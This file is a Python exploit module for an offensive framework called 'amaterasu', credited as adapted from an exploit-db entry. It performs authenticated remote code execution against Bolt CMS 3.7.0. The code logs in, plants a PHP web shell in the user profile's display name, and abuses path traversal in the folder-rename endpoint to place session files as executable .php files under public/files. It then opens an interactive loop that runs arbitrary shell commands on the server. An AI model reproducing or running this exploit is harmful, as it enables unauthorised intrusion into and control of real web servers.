#!/usr/bin/env python3
#coding: utf-8

import argparse
import cmd2
import requests
from huepy import *
import re
from bs4 import BeautifulSoup as bs
import os

from lib.opt_data import *
set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_username = set_subparsers.add_parser('username', help='username used to get admin acess')
parser_username.add_argument('username', type=str)

parser_password = set_subparsers.add_parser('password', help='password used to get admin acess')
parser_password.add_argument('password', type=str)

parser_port = set_subparsers.add_parser('port', help='port used to access the cms')
parser_port.add_argument('port', type=int)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

'''
Made by r3m0t3nu11;
Adapted by Sam Marx.
'''

class bolt_rce(cmd2.Cmd):
	def __init__(self):
		# terminal lock
		super().__init__()

		self.target = None
		self.username = None
		self.password = None
		self.port = 80

		self.metadata = {'Description'	: 'Executes authenticated remote code at Bolt CMS 3.7.0.',
						'Author'	 	: 'Sam Marx <sam-marx[at]protonmail.com>',
						'Version'	 	: '1.0',
						'Link'			: 'https://www.exploit-db.com/exploits/48296'
		}

		Options = Opt()
		Options.new(name='target', current_setting=self.target, required=True, description="Target's IP")
		Options.new(name='username', current_setting=self.username, required=True, description="Target's username")
		Options.new(name='password', current_setting=self.password, required=True, description="Target's password")
		Options.new(name='port', current_setting=self.port, required=False, description="Target's port")

		self.prompt = 'amaterasu[exploitation/bolt_rce]> '
		self.intro = f'{lightblue("Provided by:")}\n{self.metadata["Author"]}\n\n'
		self.intro += f'{lightblue("Description:")}\n{self.metadata["Description"]}\n\n'
		self.intro += f'{lightblue("Link:")}\n{self.metadata["Link"]}\n\n'
		self.intro += f'{lightblue("Options:")}\n{Options.create_table()}\n'

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'Target: {self.target}\nUsername: {self.username}\nPassword: {self.password}\nPort: {self.port}')

	def set_target(self, args):
		self.target = args.target
		print(info(f'Target set: {self.target}'))

	def set_username(self, args):
		self.username = args.username
		print(info(f'Username set: {self.username}'))

	def set_password(self, args):
		self.password = args.password
		print(info(f'Password set: {self.password}'))

	def set_port(self, args):
		self.port = args.port
		print(info(f'Password set: {self.port}'))

	parser_target.set_defaults(func = set_target)
	parser_username.set_defaults(func = set_username)
	parser_password.set_defaults(func = set_password)
	parser_port.set_defaults(func = set_port)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		if self.target is not None or self.username is not None or self.password is not None:
			request = requests.session()

			host = self.target + str(self.port)

			try:
				print(good('Retrieving CSRF token...'))
				page = request.get(f'{host}/bolt/login')

				soup = bs(page.text, 'lxml')
				token = soup.findAll('input')[2].get('value')

				login_info = {
					"user_login[username]": self.username,
					"user_login[password]": self.password,
					"user_login[login]": "",
					"user_login[_token]": token
				}

				login_request = request.post(f'{host}/bolt/login', login_info)
				print(good(f'Login token: {token}'))
			except Exception as e:
				print(bad(f'Retrieving CSRF error: {e}'))

			try:
				profile = request.get(f'{host}/bolt/profile')
				soup_profile = bs(profile.content, 'lxml')
				token_profile = soup_profile.findAll('input')[6].get('value')
				data_profile = {
					"user_profile[password][first]":"password",
					"user_profile[password][second]":"password",
					"user_profile[email]":"a@a.com",
					"user_profile[displayname]":"<?php system($_GET['test']);?>",
					"user_profile[save]":"",
					"user_profile[_token]":token_profile
				}

				new_profile = request.post(f'{host}/bolt/profile', data_profile)
			except Exception as e:
				print(bad(f'Profile error: {e}'))

			try:
				cache_csrf = request.get(f'{host}/bolt/overview/showcases')
				soup_cache = bs(cache_csrf.text, 'lxml')
				csrf_token = soup_cache.findAll('div')[12].get('data-bolt_csrf_token')

				async_browse = request.get(f'{host}/async/browse/cache/.sessions?multiselect=true')
				soup_async_browse = bs(async_browse.text, 'lxml')
				tables = soup_async_browse.find_all('span', class_='entry disabled')

				print(good('Session injection happening...'))

				for table in tables:
					file = open('session.txt', 'a+')
					file.write(table.text + '\n')
					file.close()

					num_lines = sum(1 for line in open('session.txt'))

					renamePostData = {
						"namespace": "root",
						"parent": "/app/cache/.sessions",
						"oldname": table.text,
						"newname": f"../../../public/files/test{num_lines}.php",
						"token": csrf_token
					}

					rename = request.post(f'{host}/async/folder/rename', renamePostData)

					url_files = f'{host}/files/test{num_lines}.php?test=ls%20-la'
					test_request = requests.get(url_files).text
					r1 = re.findall('php', test_request)

					if r1[0] == 'php':
						file_injection = f'test{num_lines}'
						print(good(f'Found: {file_injection}'))

					while True:
						user = input(bold(white('amaterasu>> ')))

						if user == 'quit':
							break
							os.remove('session.txt')

						r = requests.get(f'{host}/files/{file_injection}.php?test={user}')
						r2 = re.findall('...displayname";s:..:"([\w\s\W]+)', r.text)

						print(r2[0].split('<div'))
			except Exception as e:
				print(bad('Final error: {e}'))
		else:
			print(bad('You need to set all necessary options.'))